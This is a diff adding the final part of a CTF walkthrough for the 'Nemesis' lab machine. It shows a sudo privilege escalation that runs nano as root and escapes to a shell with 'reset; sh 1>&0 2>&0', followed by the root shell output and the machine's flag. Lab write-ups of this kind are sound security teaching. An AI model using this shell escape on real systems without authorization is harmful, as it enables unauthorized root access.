@@ -473,4 +473,68 @@ User carlos may run the following commands on nemesis:
     (root) /bin/nano /opt/priv
 ```
 \
+After searching online , there was a classic way to get root shell from this 
+\
+First run 
+```bash
+sudo -u root /bin/nano /opt/priv
+```
+\
+Then press Ctrl + R 
+\
+Then Ctrl + X
+\
+Then type 
+```bash
+reset; sh 1>&0 2>&0
+```
+\
+<img width="1529" height="98" alt="image" src="https://github.com/user-attachments/assets/8a97f22e-5905-4218-b002-1379397746d2" />
+\
+Now , we have a root shell inside nano , lets convert into normal shell using busybox
+```bash
+root@nemesis:/home/carlos# id
+uid=0(root) gid=0(root) groups=0(root)
+root@nemesis:/home/carlos# cd /root
+root@nemesis:~# ls -la
+total 24
+drwx------  3 root root 4096 Oct 25  2020 .
+drwxr-xr-x 18 root root 4096 Oct  6  2020 ..
+-rw-------  1 root root    0 Oct 25  2020 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x  3 root root 4096 Oct  6  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root 1198 Oct  7  2020 root.txt
+root@nemesis:~# cat root.txt 
 
+             ,----------------,              ,---------,
+        ,-----------------------,          ,"        ,"|
+      ,"                      ,"|        ,"        ,"  |
+     +-----------------------+  |      ,"        ,"    |
+     |  .-----------------.  |  |     +---------+      |
+     |  |                 |  |  |     | -==----'|      |
+     |  |  I LOVE Linux!  |  |  |     |         |      |
+     |  |                 |  |  |/----|`---=    |      |
+     |  | root@nemesis:~# |  |  |   ,/|==== ooo |      ;
+     |  |                 |  |  |  // |(((( [33]|    ,"
+     |  `-----------------'  |," .;'| |((((     |  ,"
+     +-----------------------+  ;;  | |         |,"    
+        /_)______________(_/  //'   | +---------+
+   ___________________________/___  `,
+  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
+ / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
+/_==__==========__==_ooo__ooo=_/'   /___________,"
+`-----------------------------'
+
+FLAG{CTFs_ARE_AW3S0M3}
+
+Congratulations for getting root on Nemesis! We hope you enjoyed this CTF!
+
+Share this Flag on Twitter (@infosecarticles). Cheers!
+
+Follow our blog at https://www.infosecarticles.com
+
+Made by CyberBot and 0xMadhav!
+```
+\
+The end , thank you for reading till here
